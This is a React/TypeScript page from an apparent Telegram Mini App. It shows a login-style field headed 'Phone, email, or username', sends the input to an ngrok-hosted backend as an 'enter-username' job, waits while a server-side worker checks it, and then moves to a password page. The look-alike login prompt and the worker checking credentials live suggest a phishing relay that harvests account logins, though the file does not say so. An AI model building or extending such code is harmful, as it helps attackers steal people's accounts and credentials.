// src/pages/Username.tsx
import { useState } from "react";
import axios from "axios";
import { useSignal, initData } from "@tma.js/sdk-react";
import { useNavigate } from "react-router-dom";
import "./Username.css";

import type {
  JobsStatusResponse,
  JobCommandResponse,
} from "../../../server/src/types/jobs";

import { FullScreenLoader } from "../components/FullScreenLoader";
import { Toast } from "../components/Toast";

const API_BASE = "https://juiceless-hyo-pretechnical.ngrok-free.dev/api";

export const Username = () => {
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState("");

  const initDataRaw = useSignal(initData.raw);
  const navigate = useNavigate();

  const pollCommandUntilDone = async (maxMs = 15000) => {
    const start = Date.now();

    while (Date.now() - start < maxMs) {
      const resp = await axios.post<JobsStatusResponse>(
        `${API_BASE}/jobs/status`,
        { initData: initDataRaw },
        { headers: { "Content-Type": "application/json" } }
      );

      const cs = resp.data.commandState;

      // Pas encore de commande ou pas la bonne → attendre
      if (!cs) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      if (cs.status === "pending" || cs.status === "running") {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      // done / error => on sort
      return cs;
    }

    return null; // timeout
  };

  const handleNext = async () => {
    setToast("");

    if (!initDataRaw) {
      setToast("Telegram initData missing");
      return;
    }

    const username = input.trim();
    if (!username) {
      setToast("Please enter a username");
      return;
    }

    try {
      setLoading(true);

      const cmdResp = await axios.post<JobCommandResponse>(
        `${API_BASE}/jobs/command`,
        {
          initData: initDataRaw,
          command: {
            type: "enter-username",
            payload: { username },
          },
        },
        { headers: { "Content-Type": "application/json" } }
      );

      if (!cmdResp.data.ok) {
        setLoading(false);
        setToast(cmdResp.data.error || "Command failed");
        return;
      }

      // Poll jusqu'à résultat worker
      const finalState = await pollCommandUntilDone();

      setLoading(false);

      if (!finalState) {
        setToast("Timeout, please try again");
        return;
      }

      if (finalState.status === "done" && finalState.result?.ok) {
        // ✅ username OK → go password
        navigate("/password");
        return;
      }

      // ❌ erreur username
      const msg =
        finalState.error || finalState.result?.message || "Invalid username";
      setToast(msg);
      // stay on page
    } catch (err: any) {
      setLoading(false);
      setToast(err.response?.data?.error || err.message || "Network error");
    }
  };

  return (
    <div className="username-page">
      <FullScreenLoader visible={loading} text="Checking username..." />
      <Toast message={toast} onClose={() => setToast("")} />

      <div className="username-container">
        <input
          type="text"
          placeholder="Phone, email, or username"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          className="username-input"
          disabled={loading}
        />
        <button className="next-button" onClick={handleNext} disabled={loading}>
          Next
        </button>
      </div>
    </div>
  );
};
